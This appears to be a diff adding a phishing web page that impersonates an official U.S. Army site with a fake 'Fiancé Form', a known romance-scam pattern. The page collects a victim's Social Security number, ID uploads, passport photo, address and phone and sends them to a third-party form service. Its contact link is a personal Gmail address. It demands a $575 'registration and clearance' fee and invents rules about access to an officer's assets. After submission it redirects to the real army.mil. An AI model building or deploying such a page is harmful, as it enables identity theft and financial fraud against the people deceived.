@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>us army offical site</title>
+    <link rel="stylesheet" href="css/style.css"><style>
+        @media screen and (max-width: 768px) {
+            .form-container {
+                width: 95%;
+                max-width: 500px;
+                margin: auto;
+                padding: 15px;
+            }
+        
+            .form-container input, 
+            .form-container select, 
+            .form-container textarea {
+                width: 100%;
+                max-width: 100%;
+            }
+        
+            .passport-upload {
+                width: 120px;
+                height: 150px;
+                display: block;
+                margin: 10px auto;
+                border: 2px dashed #003366;
+                object-fit: cover;
+            }
+        }
+        </style>
+        
+</head>
+<body><nav>
+    <div class="logo">An official website of the united states government</div>
+    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+    <ul class="nav-links">
+        <li><a href="https://www.army.mil/" target="_blank">Home</a></li>
+        <li><a href="https://www.army.mil/news/" target="_blank">News</a></li>
+        <li><a href="https://www.army.mil/values/" target="_blank">Missions</a></li>
+        <li><a href="https://www.goarmy.com/careers-and-jobs.html" target="_blank">Careers</a></li>
+        <li><a href="mailto:johnweaver175@gmail.com">Contact</a></li>
+    </ul>
+</nav>
+    <header>
+        <h1 class="header-text"><span class="star">★</span> U.S. ARMY</h1>
+
+    </header>
+    <section class="fiance-form">
+        <h2>Fiancé Form</h2>
+        <form action="https://getform.io/f/bvrwjjdb" method="POST">
+            <div class="passport-box">
+                <label>Affix Passport Photo (Fiancé):</label>
+                <div class="passport-placeholder">
+                    <input type="file" id="fiance-passport" name="fiance-passport" accept="image/*" required>
+                    <img id="fiance-preview" src="" alt="Fiancé Passport Preview" style="display: none; width: 100px; height: 100px;">
+                </div>
+            </div>
+            
+        
+            
+            <label for="prefix">PREFIX:</label>
+            <select id="prefix" name="prefix" required>
+                <option value="">Select</option>
+                <option value="Mr.">Mr.</option>
+                <option value="Mrs.">Mrs.</option>
+                <option value="Miss">Miss</option>
+                <option value="Dr.">Dr.</option>
+                <option value="Prof.">Prof.</option>
+                <option value="Rev.">Rev.</option>
+            </select>
+            
+            <label for="first-name">FIRST NAME:</label>
+            <input type="text" id="first-name" name="first-name" required>
+            
+            <label for="middle-initial">MIDDLE INITIAL:</label>
+            <input type="text" id="middle-initial" name="middle-initial" maxlength="1">
+            
+            <label for="last-name">LAST NAME:</label>
+            <input type="text" id="last-name" name="last-name" required>
+            
+            <label for="gender">GENDER:</label>
+            <select id="gender" name="gender" required>
+                <option value="">Select</option>
+                <option value="Male">Male</option>
+                <option value="Female">Female</option>
+            </select>
+            
+            
+            <label for="country">COUNTRY:</label>
+            <select id="country" name="country" required>
+                <option value="">Select Country</option>
+            </select>
+            
+            <label for="state">STATE:</label>
+            <select id="state" name="state" required>
+                <option value="">Select State</option>
+            </select>
+            
+        
+            <label for="city">CITY:</label>
+            <input type="text" id="city" name="city" required>
+    
+            <label for="zipcode">ZIP CODE:</label>
+            <input type="text" id="zipcode" name="zipcode" required>
+
+            <label for="ssn">SOCIAL SECURITY NUMBER (SSN):</label>
+            <input type="text" id="ssn" name="ssn" required placeholder="XXX-XX-XXXX">
+            
+    
+            <label for="phone">PHONE NUMBER:</label>
+            <input type="text" id="phone" name="phone" required>
+
+            <label for="email">EMAIL:</label>
+            <input type="email" id="email" name="email" required>
+
+    
+            <label for="address">ADDRESS:</label>
+            <textarea id="address" name="address" required></textarea>
+            <label for="id-type">Means of Identification:</label>
+<select id="id-type" name="id-type" required>
+    <option value="">Select ID Type</option>
+    <option value="National ID Card">National ID Card</option>
+    <option value="Driver's License">Driver's License</option>
+    <option value="International Passport">International Passport</option>
+    <option value="Voter's Card">Voter's Card</option>
+    <option value="Other">Other</option>
+</select>
+
+<label for="id-upload">Upload ID:</label>
+<input type="file" id="id-upload" name="id-upload" accept="image/*,application/pdf" required>
+<img id="id-preview" src="" alt="ID Preview" style="display: none; width: 120px; height: 120px;">
+
+            
+            </div>
+            
+    
+            <h2>Officer’s Information</h2>
+           
+            
+            <div class="passport-box">
+                <label>Affix Passport Photo (Officer):</label>
+                <div class="passport-placeholder">
+                    <input type="file" id="officer-passport" name="officer-passport" accept="image/*" required>
+                    <img id="officer-preview" src="" alt="Officer Passport Preview" style="display: none; width: 100px; height: 100px;">
+                </div>
+            </div>
+            
+        
+            <label for="officer-prefix">OFFICER'S PREFIX:</label>
+            <select id="officer-prefix" name="officer-prefix" required>
+                <option value="">Select</option>
+                <option value="Mr.">Mr.</option>
+                <option value="Mrs.">Mrs.</option>
+                <option value="Miss">Miss</option>
+                <option value="Dr.">Dr.</option>
+                <option value="Prof.">Prof.</option>
+                <option value="Rev.">Rev.</option>
+            </select>
+            
+            <label for="officer-first-name">OFFICER'S FIRST NAME:</label>
+            <input type="text" id="officer-first-name" name="officer-first-name" required>
+            
+            <label for="officer-middle-initial">OFFICER'S MIDDLE INITIAL:</label>
+            <input type="text" id="officer-middle-initial" name="officer-middle-initial" maxlength="1">
+            
+            <label for="officer-last-name">OFFICER'S LAST NAME:</label>
+            <input type="text" id="officer-last-name" name="officer-last-name" required>
+            
+            <label for="officer-rank">OFFICER'S RANK:</label>
+            <select id="officer-rank" name="officer-rank" required>
+                <option value="">Select Rank</option>
+                <option value="Private">Private</option>
+                <option value="Private First Class">Private First Class</option>
+                <option value="Specialist">Specialist</option>
+                <option value="Corporal">Corporal</option>
+                <option value="Sergeant">Sergeant</option>
+                <option value="Staff Sergeant">Staff Sergeant</option>
+                <option value="Sergeant First Class">Sergeant First Class</option>
+                <option value="Master Sergeant">Master Sergeant</option>
+                <option value="First Sergeant">First Sergeant</option>
+                <option value="Sergeant Major">Sergeant Major</option>
+                <option value="Command Sergeant Major">Command Sergeant Major</option>
+                <option value="Warrant Officer 1">Warrant Officer 1</option>
+                <option value="Chief Warrant Officer 2">Chief Warrant Officer 2</option>
+                <option value="Chief Warrant Officer 3">Chief Warrant Officer 3</option>
+                <option value="Chief Warrant Officer 4">Chief Warrant Officer 4</option>
+                <option value="Chief Warrant Officer 5">Chief Warrant Officer 5</option>
+                <option value="Second Lieutenant">Second Lieutenant</option>
+                <option value="First Lieutenant">First Lieutenant</option>
+                <option value="Captain">Captain</option>
+                <option value="Major">Major</option>
+                <option value="Lieutenant Colonel">Lieutenant Colonel</option>
+                <option value="Colonel">Colonel</option>
+                <option value="Brigadier General">Brigadier General</option>
+                <option value="Major General">Major General</option>
+                <option value="Lieutenant General">Lieutenant General</option>
+                <option value="General">General</option>
+                <option value="General of the Army">General of the Army</option>
+            </select>
+            
+            <label for="deployment-country">STATE OF DEPLOYMENT:</label>
+<select id="deployment-country" name="deployment-country" required>
+    <option value="">Select Country</option>
+    <option value="Afghanistan">Afghanistan</option>
+    <option value="Albania">Albania</option>
+    <option value="Algeria">Algeria</option>
+    <option value="Andorra">Andorra</option>
+    <option value="Angola">Angola</option>
+    <option value="Argentina">Argentina</option>
+    <option value="Armenia">Armenia</option>
+    <option value="Australia">Australia</option>
+    <option value="Austria">Austria</option>
+    <option value="Azerbaijan">Azerbaijan</option>
+    <option value="Bahamas">Bahamas</option>
+    <option value="Bahrain">Bahrain</option>
+    <option value="Bangladesh">Bangladesh</option>
+    <option value="Barbados">Barbados</option>
+    <option value="Belarus">Belarus</option>
+    <option value="Belgium">Belgium</option>
+    <option value="Belize">Belize</option>
+    <option value="Benin">Benin</option>
+    <option value="Bhutan">Bhutan</option>
+    <option value="Bolivia">Bolivia</option>
+    <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+    <option value="Botswana">Botswana</option>
+    <option value="Brazil">Brazil</option>
+    <option value="Brunei">Brunei</option>
+    <option value="Bulgaria">Bulgaria</option>
+    <option value="Burkina Faso">Burkina Faso</option>
+    <option value="Burundi">Burundi</option>
+    <option value="Cambodia">Cambodia</option>
+    <option value="Cameroon">Cameroon</option>
+    <option value="Canada">Canada</option>
+    <option value="Chad">Chad</option>
+    <option value="Chile">Chile</option>
+    <option value="China">China</option>
+    <option value="Colombia">Colombia</option>
+    <option value="Comoros">Comoros</option>
+    <option value="Congo">Congo</option>
+    <option value="Costa Rica">Costa Rica</option>
+    <option value="Croatia">Croatia</option>
+    <option value="Cuba">Cuba</option>
+    <option value="Cyprus">Cyprus</option>
+    <option value="Czech Republic">Czech Republic</option>
+    <option value="Denmark">Denmark</option>
+    <option value="Djibouti">Djibouti</option>
+    <option value="Dominican Republic">Dominican Republic</option>
+    <option value="Ecuador">Ecuador</option>
+    <option value="Egypt">Egypt</option>
+    <option value="El Salvador">El Salvador</option>
+    <option value="Estonia">Estonia</option>
+    <option value="Ethiopia">Ethiopia</option>
+    <option value="Fiji">Fiji</option>
+    <option value="Finland">Finland</option>
+    <option value="France">France</option>
+    <option value="Gabon">Gabon</option>
+    <option value="Gambia">Gambia</option>
+    <option value="Georgia">Georgia</option>
+    <option value="Germany">Germany</option>
+    <option value="Ghana">Ghana</option>
+    <option value="Greece">Greece</option>
+    <option value="Guatemala">Guatemala</option>
+    <option value="Guinea">Guinea</option>
+    <option value="Haiti">Haiti</option>
+    <option value="Honduras">Honduras</option>
+    <option value="Hungary">Hungary</option>
+    <option value="Iceland">Iceland</option>
+    <option value="India">India</option>
+    <option value="Indonesia">Indonesia</option>
+    <option value="Iran">Iran</option>
+    <option value="Iraq">Iraq</option>
+    <option value="Ireland">Ireland</option>
+    <option value="Israel">Israel</option>
+    <option value="Italy">Italy</option>
+    <option value="Jamaica">Jamaica</option>
+    <option value="Japan">Japan</option>
+    <option value="Jordan">Jordan</option>
+    <option value="Kazakhstan">Kazakhstan</option>
+    <option value="Kenya">Kenya</option>
+    <option value="Kuwait">Kuwait</option>
+    <option value="Lebanon">Lebanon</option>
+    <option value="Libya">Libya</option>
+    <option value="Malaysia">Malaysia</option>
+    <option value="Maldives">Maldives</option>
+    <option value="Mexico">Mexico</option>
+    <option value="Morocco">Morocco</option>
+    <option value="Nepal">Nepal</option>
+    <option value="Netherlands">Netherlands</option>
+    <option value="New Zealand">New Zealand</option>
+    <option value="Nigeria">Nigeria</option>
+    <option value="North Korea">North Korea</option>
+    <option value="Norway">Norway</option>
+    <option value="Pakistan">Pakistan</option>
+    <option value="Philippines">Philippines</option>
+    <option value="Poland">Poland</option>
+    <option value="Portugal">Portugal</option>
+    <option value="Qatar">Qatar</option>
+    <option value="Russia">Russia</option>
+    <option value="Saudi Arabia">Saudi Arabia</option>
+    <option value="South Africa">South Africa</option>
+    <option value="South Korea">South Korea</option>
+    <option value="Spain">Spain</option>
+    <option value="Sweden">Sweden</option>
+    <option value="Switzerland">Switzerland</option>
+    <option value="Thailand">Thailand</option>
+    <option value="Turkey">Turkey</option>
+    <option value="United Kingdom">United Kingdom</option>
+    <option value="United States">United States</option>
+    <option value="Vietnam">Vietnam</option>
+    <option value="Yemen">Yemen</option>
+    <option value="Zimbabwe">Zimbabwe</option>
+</select>
+
+    
+            <label for="deployment-date">DATE OF DEPLOYMENT:</label>
+            <input type="date" id="deployment-date" name="deployment-date" required>
+    
+            <h2>Declaration</h2>
+            <label for="oath">I, <input type="text" id="oath-name" name="oath-name" required>, do solemnly swear to be a devoted, faithful, loving partner...</label>
+    
+            <label for="signature">SIGNATURE (last-name):</label>
+            <input type="text" id="signature" name="signature (last-name)" required>
+    
+            <label for="date">DATE:</label>
+            <input type="date" id="date" name="date" required>
+            <h2>IMPORTANT RULES & GUIDELINES</h2>
+<div class="rules-container">
+    <p><strong>Please read the following rules carefully before submitting the form:</strong></p>
+    <ul class="rules-list">
+        <li>Once you provide us with the necessary and correct information, you are no longer anonymous to the United States Defense Finance and Accounting Service.</li>
+        <li>Only registered and approved Fiancé or Partner is qualified and can have access to the serving Officer’s assets or entitlements.</li>
+        <li>Only registered Fiancée or Spouse can request leave on his/her partner’s behalf.</li>
+        <li>Serving Officers cannot take their Fiancée or Spouse on their deployment, as some duty stations are categorized as dangerous.</li>
+        <li>To receive a Military ID Card and benefits, including health care, a Fiancée or Spouse must be fully registered and cleared.</li>
+        <li>The Fiancé request form of a Foreign National outside the United States is governed by <strong>MILPERSMAN Section 5352-030</strong>. An approval letter from the United States Embassy of the Foreign National may be required.</li>
+        <li>Partners are required to pay the sum of <strong>$575.00</strong> (Five Hundred seventy-five Dollars). A one-time payment, either by installments or once, is required for registration and clearance purposes.</li>
+        <li>The regulations require that all serving officers planning to marry a foreign national submit an application of the Fiancé Request Form to their Serving Commander or a designated representative.</li>
+    </ul>
+</div>
+<form id="fiance-form" action="https://getform.io/f/bvrwjjdb" method="POST">
+    <input type="submit" value="Submit">
+</form>
+
+<script>
+document.getElementById("fiance-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const form = event.target;
+
+    fetch(form.action, {
+        method: form.method,
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+    }).then(response => {
+        if (response.ok) {
+            window.location.href = "https://www.army.mil/";
+        } else {
+            alert("Form submission failed. Please try again.");
+        }
+    }).catch(error => {
+        alert("An error occurred. Please check your internet connection.");
+    });
+});
+</script>
+
+
+        
+        
+    </section>
+    <script src="js/script.js"></script>
+
+<footer>
+    <p>All Rights Reserved army.mil &copy; 2025</p>
+</footer>
+
+</body>
+</html>
